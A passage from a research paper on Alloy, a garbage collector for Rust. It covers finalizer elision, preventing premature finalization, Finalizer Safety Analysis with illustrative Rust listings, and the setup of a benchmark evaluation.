</p>

<p>
As shown in Algorithm <a href="#x1-11002r1">1</a>, any type which implements the <code>Drop</code> trait requires finalization unless it also
implements the new <code>DropMethodFinalizerElidable</code> <em>marker trait</em> (i.e. a trait without methods). This
trait can be used by a programmer to signify that a type's drop method need not be called if the type is
placed inside a <code>Gc&lt;T&gt;</code>. The 'Drop' part of the trait name is deliberate (i.e. it is not a simplification of
'destructor') as it allows the programmer to reason about a type locally (i.e. without considering drop
glue or concrete type paramaters). If the type has a transitively reachable field whose type implements
the <code>Drop</code> trait but not the <code>DropMethodFinalizerElidable</code> trait, then then the top-level type still
requires finalization.
</p>

<p>
Even though neither normal Rust destructors or <span>Alloy</span> finalizers are guaranteed to run, a program
whose destructors or finalizers never run would probably not be usable (leaking resources such as
memory, deadlocking, and so on). We therefore make <code>DropMethodFinalizerElidable</code> an unsafe trait,
because implementing it inappropriately is likely to lead to undesired – though not incorrect! –
behaviour at run-time.
</p>

<p>
<span>Alloy</span> modifies the standard Rust library to implement <code>DropMethodFinalizerElidable</code> on the following types:
<code>Box&lt;T&gt;</code>, <code>Vec&lt;T&gt;</code>, <code>RawVec&lt;T&gt;</code>, <code>VecDeque&lt;T&gt;</code>, <code>LinkedList&lt;T&gt;</code>, <code>BTreeMap&lt;K, V&gt;</code>, <code>BTreeSet&lt;T&gt;</code>, <code>HashMap&lt;K, V&gt;</code>, <code>HashSet&lt;T&gt;</code>,
<code>RawTable&lt;K, V&gt;</code><span><a href="#fn6x0"><sup>6</sup></a></span><a id="x1-12001f6"></a>,
and <code>BinaryHeap&lt;T&gt;</code>. Fortunately, not only are these types' drop methods compatible with
<code>DropMethodFinalizerElidable</code>, but they are extensively used in real Rust code: they enable significant
numbers of finalizers to be elided.
</p>

<p>
Listing <a href="#x1-11019r3">3</a> shows the new const compiler intrinsic <code>needs_finalizer</code> we added to implement
Algorithm <a href="#x1-11002r1">1</a>. The intrinsic is evaluated at compile-time: its result can be inlined into <code>Gc::new</code>, allowing
the associated conditional to be removed too. In other words – compiler optimisations allowing – the
'does this specific type require a finalizer?' check has no run-time overhead.
</p>

<h3><span>6    </span> <a id="x1-130006"></a>Premature Finalizer Prevention</h3>

<p>Most of us assume that finalizers are always run later than the equivalent destructor would have run, but
they can sometimes run before [<a href="#Xboehm03destructors">6</a>, section 3.4], undermining soundness. Such premature finalization is
also possible in <span>Alloy</span> as described thus far (see Listing <a href="#x1-13001r4">4</a>). In this section we show how to prevent
premature finalization.
</p>

<p>
There are two aspects to premature finalization. First, language specifications often do not define, or do
not precisely define, when the earliest point that a value can be finalized is. While this means
that, formally, there is no 'premature' finalization, it seems unlikely that language designers
anticipated some of the resulting implementation surprises (see e.g. this example in Java [<a href="#Xshipilev20local">29</a>]).
Second, compiler optimisations – at least in LLVM – are 'GC unaware', so optimisations such
as scalar replacement can change the point in a program when GCed values appear to be
finalizable.
</p>

<figure>
<a id="x1-13001r4"></a>

<pre><code>struct S { value: u8 }
impl Drop for S { fn drop(&amp;mut self) { self.value = 0; } }

fn main() {
  let root = Gc::new(Box::new(S{ value: 1 }));
  let inner: &amp;u8 = &amp;**root.value;
  force_gc();
  println!("{}", *inner);
}</code></pre>
<figcaption>
    <span>Listing 4. </span>
    <span>An example of possible premature finalization. We create a new struct <code>S</code> (<span data-line="1">line 1</span>) with
a drop method that sets the wrapped integer to zero (<span data-line="2">line 2</span>). In the main method, we move an
instance of the struct into a <code>Box&lt;T&gt;</code>, which we then move into a <code>Gc&lt;T&gt;</code> (<span data-line="4">line 4</span>). We obtain a Rust
reference to the inner integer (<span data-line="5">line 5</span>), which at run-time will be a pointer to the <code>Box&lt;T&gt;</code>. At this
point, the compiler can determine that the <code>Gc&lt;T&gt;</code> is no longer used and overwrite <code>root</code>'s pointer
(which may be in a register). If a collection then occurs, a finalizer can run <code>S</code>'s drop method,
causing the program to print '0' instead of the expected '1' (<span data-line="7">line 7</span>).</span>
</figcaption>


</figure>

<p>
In our context, it is natural to define premature finalization as a (dynamic) finalizer for a <code>Gc&lt;T&gt;</code> value
running before the (static) <code>Gc&lt;T&gt;</code> owner has gone out of scope. Similar to the high-level proposal mooted
in [<a href="#Xboehm07optimization">7</a>, Solution 1], we must ensure that the dynamic lifetime of a reference derived from a <code>Gc&lt;T&gt;</code> matches
or exceeds the lifetime of the <code>Gc&lt;T&gt;</code> itself.
</p>

<p>
Our solution relies on adjusting <code>Gc&lt;T&gt;</code>'s drop method to keep alive a GCed value for at least the static
lifetime of the <code>Gc&lt;T&gt;</code> itself. In other words, we ensure that the conservative GC will always see a pointer
to a GCed value while the corresponding <code>Gc&lt;T&gt;</code> is in-scope.
</p>

<p>
However, there is a major problem to overcome: copyable types such as <code>Gc&lt;T&gt;</code> are forbidden from
having destructors. The fundamental challenge we have to solve is that each copied value will have a
destructor called on it, which has the potential for any shared underlying value to be destructed more
than once. <span>Alloy</span> explicitly allows <code>Gc&lt;T&gt;</code> – but no other copyable type – to have a destructor, but to
ensure it doesn't cause surprises in the face of arbitrary numbers of copies, the destructor must be
idempotent. Our task is made easier because <code>Gc&lt;T&gt;</code> naturally has no drop glue from Rust's perspective:
<code>Gc&lt;T&gt;</code> consists of a field with a pointer type, and such types are opaque from a destruction
perspective.
</p>

<p>
We therefore only need to make sure that <code>Gc&lt;T&gt;</code>'s drop method is idempotent. Fortunately, this is
sufficient for our purposes: we want the drop method to inhibit finalization but that does not
require run-time side effects. To achieve this, we use a <em>fence</em>. These come in various flavours.
What we need is a fence that prevents both: the compiler from reordering computations
around a particular syntactic point; and the CPU from reordering computations around a
particular address. We copy the platform specific code from the <span>BDWGC</span> <code>GC_reachable_here</code>
macro<span><a href="#fn7x0"><sup>7</sup></a></span><a id="x1-13011f7"></a>
into <code>Gc&lt;T&gt;</code>'s drop method, which achieves the effect we require.
</p>

<p><span>6.1    </span> <a id="x1-140006.1"></a>Optimising Premature Finalizer Prevention</p>

<p>The drop method we add to <code>Gc&lt;T&gt;</code> fully prevents premature finalization. It also naturally solves a
performance problem with the suggested solution for C++ in [<a href="#Xboehm07optimization">7</a>, Solution 1], which requires keeping
alive all pointers, no matter their type, for their full scope. By definition, our solution only
keeps alive <code>Gc&lt;T&gt;</code> values: the compiler is free to optimise values of other types as it so wishes.
However, on an artificial microbenchmark we observed a noticeable overhead from our fence
insertion.
</p>

<p>
We thus implemented a simple optimisation: we only insert fences for a <code>Gc&lt;T&gt;</code> if it has a finalizer.
Intuitively, it seems that we should not generate drop methods in such cases, but this is difficult to do
directly inside <code>rustc</code>. Instead, we suppress calls to the drop methods of such types: the two approaches
are functionally equivalent, though ours does put an extra burden on dead-code elimination in the
compiler tool-chain.
</p>

<p>
<span>Alloy</span> adds a new pass <code>RemoveElidableDrops</code> to <code>rustc</code>'s Mid-Level Intermediate Representation
(MIR) processing. MIR is best thought of as the main IR inside <code>rustc</code>: it contains the complete set of
functions in the program, where each function consists of a sequence of basic blocks. Simplifying
somewhat, function and drop method calls are represented as different kinds of <em>terminators</em> on basic
blocks. Terminators reference both a callee and a successor basic block.
</p>

<p>
The <code>remove_elidable_drops</code> pass iterates over a program's MIR, identifies drop method
terminators which reference elidable finalizers, and turns them into 'goto' terminators to the
successor basic basic block. Algorithm 4 in the Appendix presents a more formal version of this
algorithm.
</p>

<h3><span>7    </span> <a id="x1-150007"></a>Finalizer Safety Analysis</h3>

<p>In this section we address two high-level problems: running finalizers on the same thread as a paused
mutator can cause race conditions and deadlocks; and some safe destructors are not safe finalizers.
Addressing the former problem is conceptually simple – finalizers must be run on a separate thread – but
we must ensure that doing so is sound. We therefore consider this a specific instance of the latter
problem, treating both equally in this section.
</p>

<p>
We therefore introduce Finalizer Safety Analysis (FSA), which prevents unsafe (in the sense of 'not
safe Rust') destructors being used as finalizers. As a first approximation, FSA guarantees
that finalizers are memory safe, cycle safe (i.e. do not access already finalized objects), and
thread safe. We present the three main components of FSA individually before bringing them
together.
</p>

<p><span>7.1    </span> <a id="x1-160007.1"></a>Rust References</p>

<p><code>Gc&lt;T&gt;</code> can store, directly or indirectly, normal Rust references (i.e. <code>&amp;</code> and <code>&amp;mut</code>), at which point it is
subject to Rust's normal borrow checker rules and cannot outlive the reference. However, finalizers
implicitly extend the lifetime of a GCed value, including any stored references: accessing a reference in a
finalizer could undermine Rust's borrow checking rules.
</p>

<p>
A simple way of avoiding this problem is to forbid <code>Gc&lt;T&gt;</code> from storing, directly or indirectly,
references. This might seem to be no great loss: storing references in a <code>Gc&lt;T&gt;</code> largely nullifies the
'GCness' of <code>Gc&lt;T&gt;</code>. However, we found the result hard to use, as it can make simple tasks such as
gradually migrating existing code to use <code>Gc&lt;T&gt;</code> painful.
</p>

<p>
A moderate, but in our experience insufficient, relaxation is to recognise that only types that
need a finalizer can possibly have problems with references, and to forbid such types from
storing references in <code>Gc&lt;T&gt;</code>. For example, if there is no drop method for <code>struct S{x: &amp;u8}</code>
then its destructor is safe to use as a finalizer, since its non-drop aspects will not use the <code>&amp;u8</code>
reference.
</p>

<p>
The eventual rule we alighted upon for FSA is that a destructor for a type <code>T</code> can be used as a
finalizer provided the destructor's drop methods do not obtain references derived from <code>T</code>'s
fields (including fields reachable from its attributes). Using Rust's terminology, we forbid
<em>projections</em> (which include a struct's fields, indexes into a vector, and so on) in destructors from
generating references. Any non-projection references that are used in a destructor are by
definition safe to use, as they either exist only for the duration of the drop method (references to
variables on the stack) or will exist for the remainder of the program (references to global
variables).
</p>

<p>
This rule over-approximates the safe set of destructors. For example, a drop method that
creates a new value and tries to obtain a reference to a field in it (i.e. a projection) cannot be a
destructor under FSA, even though the reference cannot outlast the drop method. We found that
attempting to relax our rule further to deal with such cases rapidly complicates exposition and
implementation.
</p>

<figure>
<pre><code>struct GcNode { value: u8, nbr: Option<gc<refcell<gcnode>&gt;&gt; }
impl Drop for GcNode {
  fn drop(&amp;mut self) { self.value = 0; println!("{}", self.nbr.unwrap().borrow().value); }
}

fn main() {
  let mut gc1 = Gc::new(RefCell::new(GcNode{value: 1, nbr: None}));
  let gc2 = Gc::new(RefCell::new(GcNode{value: 2, nbr: None}));
  gc1.borrow_mut().nbr = Some(gc2);
  gc2.borrow_mut().nbr = Some(gc1);
}</gc<refcell<gcnode></code></pre>
<figcaption>
    <span>Listing 5. </span>
    <span>An example of the problems that come from mixing cycles and finalization. The salient
difference from Listing <a href="#x1-1001r1">1</a> is that the drop method prints the value of a field inside <code>nbr</code> (<span data-line="3">line
3</span>). Running this program on a strong memory model machine is likely to print either <code>2 0</code> or <code>1 0</code>
depending on whether <code>gc1</code> or <code>gc2</code> is finalized first. The 'seemingly expected' output of <code>1 2</code> or <code>2 1</code>
would never be printed: whichever GCed value is finalized first changes what the other GCed
value sees in its finalizer. As that implies, this example is unsound: whichever finalizer runs
second leads to undefined behaviour.</span>
</figcaption>
</figure>

<p><span>7.2    </span> <a id="x1-170007.2"></a>Cycles and Finalization</p>

<p>One of the main motivations for GCs is that they solve problems with cyclic data structures. However,
finalizers can be unsound if they access state shared within members of a cycle. Listing <a href="#x1-16001r5">5</a> shows an
example of undefined behaviour when two GCed values create a cycle and both their finalizers reference
the other GCed value. Whichever order the finalizers are run in, at least one of the finalizers will see the
other GCed value as partly or wholly 'finalized'.
</p>

<p>Most languages and systems we are aware of assume that users either don't run into this problem
    (finalization cycles are considered rare in GCed languages [<a href="#Xjones23garbage">19</a>, p. 229]) or know how to deal with it when they do (e.g. refactoring the
    types into parts that do and don't require finalization [<a href="#Xboehm03destructors">6</a>, p. 11]). There is no fully automatic
    solution to this problem. Some GCs offer weak references, which allow users to detect when
    finalization cycles have been broken, though they still have to deal with the consequences
    manually.</p>

<p>
We wanted to provide users with static guarantees that their destructors will not behave unexpectedly
when used as finalizers in a cycle. A first attempt at enforcing such a property might seem to
be that a <code>Gc&lt;T&gt;</code> cannot have, directly or indirectly, fields of type <code>Gc&lt;T&gt;</code>. This would indeed
prevent the mistakes we want to catch but also disallow shared ownership! We therefore
check only that a type's destructor does not, directly or indirectly, access a <code>Gc&lt;T&gt;</code>. This allows
GCed types to express shared ownership so long as their destructor(s) do not access other GC
types.
</p>

<p>
To make this check easier to implement, we introduce an <em>auto trait</em> [<a href="#Xrustlangref">27</a>, Section. 11], a kind of marker
trait that the compiler propagates automatically. An auto trait <code>A</code> will be automatically implemented for a
type <code>T</code> unless one of the following is true: there is an explicit <em>negative implementation</em> of <code>A</code> for <code>T</code>; or <code>T</code>
contains a field that is not itself <code>A</code>. Informally, we say that a negative implementation of an auto-trait
<em>pollutes</em> containing types.
</p>

<p>
Our new auto trait is called <code>FinalizerSafe</code>, and we provide a single negative implementation
<code>impl&lt;T&gt; !FinalizerSafe for Gc&lt;T&gt;</code>. This naturally handles transitively reachable code, allowing FSA
itself to only check that a destructor's direct field accesses are <code>FinalizerSafe</code>.
</p>

<p><span>7.3    </span> <a id="x1-180007.3"></a>Destructors Need to be Runnable on a Finalizer Thread</p>

<figure>
<pre><code>impl Drop for GcNode {
  fn drop(&amp;mut self) { println!("drop {}", self.value.lock().unwrap()); }
}

fn main() {
  let counter = Rc::new(Mutex::new(0));
  { let _ = Gc::new(GcNode { value: Rc::clone(&amp;counter), nbr: None }); }
  let r1 = counter.lock().unwrap();
  force_gc();
  assert_eq!(*r1, 0);
}</code></pre>
<figcaption>
    <span>Listing 6. </span>
    <span>How destructors can cause deadlocks when used as finalizers. The mutator creates a
reference-counted mutex (<span data-line="6">line 6</span>), placing a copy in a <code>GcNode</code> that immediately goes out of scope
(<span data-line="7">line 7</span>). The mutator then acquires the lock (<span data-line="8">line 8</span>) but before it can release the lock a GC cycle
occurs and the <code>GcNode</code>'s finalizer run (<span data-line="9">line 9</span>). If the finalizer is run on the same thread as the
mutator, then it will fail to grab the lock (<span data-line="2">line 2</span>) and cause a deadlock.</span>
</figcaption>
</figure>

<p>
Running finalizers on the same thread as a mutator can cause problems when the finalizer accesses
state shared with the mutator (see Section <a href="#x1-90004.1">4.1</a> for a general description and Listing <a href="#x1-18001r6">6</a> for a concrete
example). The most general solution to this problem is to run finalizers on a separate <em>finalizer thread</em> that
never runs mutator code.
</p>

<p>
We must therefore ensure that it is safe to run a type's destructor on the finalizer thread. A
conservative definition is that <code>Gc&lt;T&gt;</code> is safe to use if <code>T</code> implements both of Rust's existing <code>Send</code> (denoting
a type that can be permanently moved from one thread to another) and <code>Sync</code> (denoting a type that can be
safely accessed simultaneously by multiple threads) auto traits. However, requiring that finalization be
restricted to types that implement both <code>Send</code> and <code>Sync</code> can be frustrating, particularly because more
types implement <code>Send</code> than <code>Sync</code>.
</p>

<p>
It may seem sufficient for <code>T</code> to implement <code>Send</code> alone so that the value can be safely sent to the finalizer
thread. However, this would not prevent a finalizer indirectly accessing state shared with a
non-GCed value via a mechanism such as <code>Arc</code>, causing the very problems we are trying to
avoid.
</p>

<p>
FSA thus ignores whether a type implements <code>Send</code> or <code>Sync</code> (or not) and instead examines the
destructor directly. To pass FSA: the destructor must not access thread locals; and any types the
destructor accesses via projections must implement both <code>Send</code> and <code>Sync</code>. Intuitively, this allows a
non-<code>Send</code>-or-<code>Sync</code> type <code>T</code> to have a safe finalizer provided that <code>T</code>'s destructor only access the <code>Send</code> and
<code>Sync</code> 'subset' of <code>T</code>.
</p>

<p>
This rule shows clearly that FSA is a form of abstract interpretation rather than a mere extension of the type
system<span><a href="#fn8x0"><sup>8</sup></a></span><a id="x1-18013f8"></a>.
After careful examination we believe this is compatible with Rust's semantics (and <code>rustc</code> and LLVM's
implementations) at the time of writing, but it is worth knowing that this rule would be unsafe in other
languages and implementations (for example our assumption would be unsafe in Java due to
synchronisation removal [<a href="#Xwang06escape">31</a>]). We leave it as an open question to others as to whether Rust should
deliberately permit or forbid such checks in its semantics.
</p>

<p>
The implementation of the finalization thread is fairly simple. For example, we do not need to
explicitly synchronise memory between the mutator and finalization threads because <span>BDWGC</span>'s
stop-the-world collection phase already synchronises all memory between threads.
</p>

<p><span>7.4    </span> <a id="x1-190007.4"></a>Putting it All Together</p>

<figure>
<a id="x1-19002r2"></a>
<pre><code>function FinalizerSafetyAnalysis(func):
    for each basic_block ∈ func do
        t ← basic_block.terminator;
        if not IsGcConstructorCall(t) then
            continue;
        ty ← GetTyOfGcValue(t);
        if isFinalizerUnchecked(ty) or not NeedsFinalizer(ty) then
            continue;
        for each drop_method ∈ GetDropGlue(ty) do
            if not IsMIRAvailable(drop_method) then
                EmitFinalizerUnsafeError();
            CheckFunctionSafety(drop_method);

function CheckFunctionSafety(drop):
    for each basic_block ∈ drop do
        for each statement ∈ basic_block do
            for each projection ∈ statement do
                if not IsFinalizerSafe(projection.element) then
                    EmitFinalizerUnsafeError();
        if IsFunctionCall(basic_block.terminator) then
            CheckFunctionSafety(basic_block.terminator);

function IsFinalizerSafe(ty):
    return Impls(ty, Send) and Impls(ty, Sync) and Impls(ty, FinalizerSafe);</code></pre>

<figcaption><span>Algorithm 2. </span><span>Finalizer Safety Analysis</span></figcaption>
</figure>

<p>
FSA integrates the seemingly separate components presented above into one. It iterates over every
function in a Rust program analysing destructors of types that are used in <code>Gc&lt;T&gt;</code>. Algorithm <a href="#x1-19002r2">2</a> shows the
essence of FSA (for example eliding details of caching which <span>Alloy</span> uses to speed up compile
times).
</p>

<p>
Because FSA is a form of abstract interpretation, we need to determine when to run FSA on a program.
In essence, whenever a previously unchecked type <code>T</code> is used to create a new <code>Gc&lt;T&gt;</code>, FSA is run. As well as
the <code>Gc::new</code> constructor, <code>Gc&lt;T&gt;</code> instances can be created with conversion traits such as <code>From</code>. We
annotated each such entry point with a new <code>rustc</code>-only attribute <code>rustc_fsa_entry_point</code>: calls to
functions with this attribute lead to FSA checks.
</p>

<p>
A naive implementation of FSA would be a notable cost, so <span>Alloy</span> uses several optimisations. As
alluded to above, FSA caches the results of various checks to avoid pointlessly repeating work. We also
extend <code>FinalizerSafe</code> with negative implementations for <code>&amp;T</code>, and <code>&amp;mut T</code>. If a type <code>T</code> implements all of
<code>FinalizerSafe</code>, <code>Send</code>, and <code>Sync</code>, we know that there can be no unsafe projections used in a destructor,
and can bypass most FSA checks entirely (though we still need to check for thread local accesses).
Across our benchmark suite, FSA increases compilation time in release mode by a modest
0.8–1.6%.
</p>

<p>
Algorithm <a href="#x1-19002r2">2</a> also captures <span>Alloy</span>'s approach to error messages. Rather than just inform a user that
'your drop method has not passed FSA', <span>Alloy</span> pinpoints which field or line in a drop method caused FSA
to fail: <code>EmitReferenceError</code> informs the user when a reference in a type is used in a way that violates
FSA (see Section <a href="#x1-160007.1">7.1</a>); and <code>EmitFinalizerUnsafeError</code> when a drop method contains code which is
unsafe (e.g. references a <code>Gc&lt;T&gt;</code> type, an opaque function, etc.). Listing <a href="#x1-19052r7">7</a> shows an example of the errors
reported by <span>Alloy</span>: note that it pinpoints the line within a drop method that caused an FSA
error.
</p>

<figure>
<pre><code>error: `RefCell::new(GcNode{value: 2, nbr: None})` cannot be safely finalized.
   --&gt; finalization_cycle.rs:11:21
   |
7  |   fn drop(&amp;mut self) { self.value = 0; println!("{}", self.nbr.unwrap().borrow().value); }
   |                                                       <span>^^^^^^^^</span>
   |                                                       <span>a finalizer cannot safely dereference this</span>
   |                                                       <span>because it might have already been finalized.</span>
...
11 |   let gc2 = Gc::new(RefCell::new(GcNode{value: 2, nbr: None}));
   |       <span>^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^</span>
   |       <span>has a drop method which cannot be safely finalized.</span></code></pre>

<figcaption><span>Listing 7. </span><span>The compiler error produced by <span>Alloy</span> for the example in Listing <a href="#x1-16001r5">5</a>. This extends
<code>rustc</code>'s normal error messages: note that both the use of a type with a FSA-incompatible drop
method ('has a drop method') and the line in the drop method ('caused by the expression') are
highlighted to the user.</span></figcaption>
</figure>

    <p><span>7.4.1    </span> <a id="x1-200007.4.1"></a>Awkward Kinds of Functions</p>

<p>FSA can encounter two kinds of 'awkward' functions.</p>

<p>
First, some functions (e.g. due to use of trait objects, or FFIs) do not have a body available when FSA
runs: using such a function necessarily causes an FSA check to fail. One common class of functions
which causes this are Rust intrinsics (e.g. <code>min_align_of</code> etc.): we audited the most frequently used of
these and annotated those which are FSA-safe with a new <code>rustc_fsa_safe_fn</code> attribute. Other functions
whose bodies are unknown cause FSA to fail.
</p>

<p>
Second, in most cases, FSA runs on Rust functions whose generic types have been replaced with
concrete types (in Rust terminology, functions have been 'monomorphised'). Sometimes, however, FSA
encounters functions (e.g. intrinsics or functions with certain annotations) whose generic types have not
yet been replaced. FSA can still run on such functions, but will reject them unless all generic types imply
the <code>FinalizerSafe</code>, <code>Send</code>, and <code>Sync</code> traits. Note that calling a method on a generically typed value will
lead to FSA finding a method without a body: as in the first case above, this will cause FSA to
fail.
</p>

<p>
The common theme to both is that we wish FSA to be sound, at which point we forego completeness.
This can cause users frustration when FSA raises an error on code they know is FSA safe. As is common
in Rust, we therefore provide an unsafe escape hatch which allows users to silence FSA errors when they
can prove to their satisfaction that doing so does undermine correctness. We experimented
with a per-type approach, but found that unduly restrictive: we therefore provide a per-value
escape hatch with the <code>unsafe FinalizerUnchecked&lt;T&gt;</code> type. Values wrapped in this type are
considered safe to use at all points in FSA. Our aim is that users should rarely need to resort to this
escape hatch, but, as is not uncommon in Rust, there are valid idioms of use where we found it
necessary.
</p>

    <h3><span>8    </span> <a id="x1-210008"></a>Evaluation</h3>

<figure>
<a id="x1-21001r1"></a>
<table>
<thead>
<tr>
<th></th>
<th>Version</th>
<th>Description</th>
<th>#benchmarks</th>
</tr>
</thead>
<tbody>
<tr>
<td><span>Binary Trees</span></td>
<td>Debian CLBG Rust#2</td>
<td>Heap allocation microbenchmark</td>
<td>1</td>
</tr>
<tr>
<td><span>Regex-Redux</span></td>
<td>Debian CLBG Rust#1</td>
<td>Regular expression matching</td>
<td>1</td>
</tr>
<tr>
<td><span>Alacritty</span></td>
<td>v0.15.0-dev</td>
<td>Terminal emulator</td>
<td>10</td>
</tr>
<tr>
<td><span>fd</span></td>
<td>v9.0.0</td>
<td>Unix find replacement</td>
<td>7</td>
</tr>
<tr>
<td><span>grmtools</span></td>
<td>v0.13.4</td>
<td>Lexer / parser library</td>
<td>4</td>
</tr>
<tr>
<td><span>Ripgrep</span></td>
<td>v14.1.1</td>
<td>Fast grep replacement</td>
<td>13</td>
</tr>
<tr>
<td><span>som-rs-ast</span></td>
<td>git #35b780</td>
<td>SOM AST VM</td>
<td>26</td>
</tr>
<tr>
<td><span>som-rs-bc</span></td>
<td>git #35b780</td>
<td>SOM bytecode VM</td>
<td>26</td>
</tr>
</tbody>
</table>
<figcaption><span>Table 1.  </span><span>The benchmarks (top) and benchmark suites (bottom) that form our experiment. We altered them
to use different memory allocation strategies (<span>Alloy</span>, <code>Rc&lt;T&gt;</code>, etc.). <span>Binary Trees</span> and <span>Regex-Redux</span> are classic
stand-alone GC benchmarks; the other 'benchmarks' represent benchmark suites (e.g. <span>Ripgrep</span> contains 13
benchmarks). The middle portion of the table shows a variety of 'normal' Rust programs; the bottom portion
of the program shows three implementations of the SOM programming language.</span></figcaption>
</figure>

<p>In this section we explain our methodology and our experimental results.</p>

<p><span>8.1    </span> <a id="x1-220008.1"></a>Methodology</p>

<p><span>8.1.1    </span> <a id="x1-230008.1.1"></a>The Benchmark Suite</p>

<p>There is no existing benchmark suite for GCs for Rust. Even if such a suite did exist, it may not have
been suitable for our purposes because in experiment <span>E<sub>GCvs</sub></span> we want to compare programs using
existing shared ownership approaches. We searched through roughly the 100 most popular Rust libraries
on <code>crates.io</code> (the <em>de facto</em> standard Rust package system) looking for suitable candidates. In
practise this meant we looked for crates using reference counting. In the interests of brevity,
for the rest of this section we use '<code>Rc&lt;T&gt;</code>' to cover both <code>Rc&lt;T&gt;</code> and its thread-safe cousin
<code>Arc&lt;T&gt;</code>.
</p>

<figure>
<a id="x1-23001r2"></a>
<table>
<thead>
<tr>
<th></th>
<th><code>Gc&lt;T&gt;</code></th>
<th><code>Rc&lt;T&gt;</code></th>
<th>Weak&lt;T&gt;</th>
</tr>
</thead>
<tbody>
<tr>
<td><span>Alacritty</span></td>
<td>107</td>
<td>9,450</td>
<td>1,970</td>
</tr>
<tr>
<td><span>Binary Trees</span></td>
<td>2</td>
<td>0</td>
<td>0</td>
</tr>
<tr>
<td><span>fd</span></td>
<td>7</td>
<td>421</td>
<td>1</td>
</tr>
<tr>
<td><span>grmtools</span></td>
<td>299</td>
<td>1,825</td>
<td>23</td>
</tr>
<tr>
<td><span>Regex-Redux</span></td>
<td>108</td>
<td>109</td>
<td>0</td>
</tr>
<tr>
<td><span>Ripgrep</span></td>
<td>104</td>
<td>249</td>
<td>4</td>
</tr>
<tr>
<td><span>som-rs-ast</span></td>
<td>206</td>
<td>35</td>
<td>0</td>
</tr>
<tr>
<td><span>som-rs-bc</span></td>
<td>464</td>
<td>39</td>
<td>0</td>
</tr>
</tbody>
</table>
<figcaption><span>Table 2.  </span><span>How often relevant types are referenced in source code after our porting. For <code>Rc&lt;T&gt;</code>, we also show
how many weak references are left in: this is a proxy both for partial porting, and also how the extent weak
references. This is a proxy for the extent of changes that cyclic data-structures impose upon source code.</span></figcaption>
</figure>

<p>
Table <a href="#x1-21001r1">1</a> shows the resulting suite: note that, except for <span>Binary Trees</span> and <span>Regex-Redux</span>, the
'benchmarks' are themselves benchmark suites. Collectively, our suite contains – depending on whether
you count the SOM implementations' (identical) benchmark suites collectively or separately – 62 or 88
benchmarks. Table <a href="#x1-23001r2">2</a> shows how often relevant types are used after porting. Table <a href="#x1-23002r3">3</a> shows the
distribution of heap data at run-time. This shows that our suite contains benchmarks with a variety of
memory patterns.
</p>

<p>
<span>Binary Trees</span> is allocation intensive and sufficiently simple that it can be easily and meaningfully
ported to additional shared ownership strategies: <span>Rust-GC</span>, a user library for GC for Rust [<a href="#Xmanish15rustgc">14</a>]; and
<code>Arena&lt;T&gt;</code>, a non-GC memory arena [<a href="#Xchiovoloni15typed">10</a>]. <span>Alacritty</span>, <span>fd</span>, and <span>Ripgrep</span> are well known Rust programs, all
of which have their own benchmark suites. <span>grmtools</span> is a parsing library which uses <code>Rc&lt;T&gt;</code> extensively
in error recovery: we benchmarked it using 28KLoC of real Java source code, which we mutated with
syntax errors.
</p>

<p>
SOM is a small, but complete, language in the Smalltalk mould, which has a wide variety of
implementations. Our suite includes two of these: <span>som-rs-ast</span> (which represents programs as ASTs); and
<span>som-rs-bc</span> (which represents programs as bytecode). Both are existing ports of a Java SOM VM into Rust
and use <code>Rc&lt;T&gt;</code>. We use the same SOM <code>core-lib</code> benchmarks for both, derived from git commit
#afd5a6.
</p>

<p>
We were not able to port all parts of all programs. In particular, some programs make extensive use of
the <code>make_mut</code> and <code>get_mut</code> functions in <code>Rc&lt;T&gt;</code>, which allow a programmer to mutate their contents if, at
run-time, they only have a single owner. There is not, and cannot be, equivalent functionality with a
copyable <code>Gc&lt;T&gt;</code> type. In some cases we were able to successfully use alternative mechanisms. In others
we judged the usages to either be rare at run-time (i.e. not worth porting), or too difficult to port (i.e. too
much of the program is built around the resulting assumptions). In a small number of cases we
ended up introducing bugs. <span>Alacritty</span>'s UTF-8 support is an example, resulting in deadlocks.
Whenever we encountered a bug in our porting, we reverted back to <code>Rc&lt;T&gt;</code> for that portion of the
port.
</p>

<figure>
<a id="x1-23002r3"></a>
<table>
<thead>
<tr>
<th></th>
<th colspan="3">Allocated (#)</th>
<th>GC owned (%)</th>
</tr>
<tr>
<th></th>
<th><code>Rc&lt;T&gt;</code></th>
<th>Box&lt;T&gt;</th>
<th><code>Gc&lt;T&gt;</code></th>
<th></th>
</tr>
</thead>
<tbody>
<tr>
<td><span>Alacritty</span></td>
<td>125</td>
<td>8,770</td>
<td>2</td>
<td>2.70</td>
</tr>
<tr>
<td><span>Binary Trees</span></td>
<td>0</td>
<td>3,222,201</td>
<td>3,222,190</td>
<td>100.00</td>
</tr>
<tr>
<td><span>fd</span></td>
<td>17,821</td>
<td>306,902</td>
<td>61</td>
<td>1.23</td>
</tr>
<tr>
<td><span>grmtools</span></td>
<td>2,283</td>
<td>19,859,431</td>
<td>4,038,605</td>
<td>44.19</td>
</tr>
<tr>
<td><span>Regex-Redux</span></td>
<td>45</td>
<td>3,132</td>
<td>78</td>
<td>15.39</td>
</tr>
<tr>
<td><span>Ripgrep</span></td>
<td>12,786</td>
<td>521,366</td>
<td>26,069</td>
<td>17.97</td>
</tr>
<tr>
<td><span>som-rs-ast</span></td>
<td>15</td>
<td>8,586,976</td>
<td>1,533,728</td>
<td>76.95</td>
</tr>
<tr>
<td><span>som-rs-bc</span></td>
<td>15</td>
<td>2,397,931</td>
<td>1,530,325</td>
<td>99.71</td>
</tr>
</tbody>
</table>
<figcaption><span>Table 3.  </span><span>Run-time heap distributions. The 'Allocated (#)' columns shows the number of values of each type
that are allocated (note that most programs also allocate values of other types, but those are not shown
directly here). The 'GC Owned' columns shows the proportion of allocated values that are owned, directly
and indirectly, by <code>Gc&lt;T&gt;</code> values. For example, a program consisting of a single <code>Gc&lt;Box&lt;T&gt;&gt;</code> would have a
'GC Owned' value of 100% because the <code>Box&lt;T&gt;</code> is owned by the <code>Gc&lt;T&gt;</code>. As we shall see later, there can be a
number of knock-on effects when a <code>Gc&lt;T&gt;</code> owns other such values.</span></figcaption>
</figure>

<p><span>8.1.2    </span> <a id="x1-240008.1.2"></a>What We Couldn't Include in the Benchmark Suite</p>

<p>We tried porting 10 other programs that are not included in our benchmark suite. To avoid readers
wondering if we have 'cherry-picked' our eventual benchmark suite, we briefly report why those
other programs have been excluded. All excluded benchmarks are shown in Table 4 in the
Appendix.
</p>

<p>
Several programs (e.g. numbat, mini-moka, and salsa), once ported, turned out to be uninteresting
from a GC benchmarking perspective. Irrespective of the number of source locations that reference
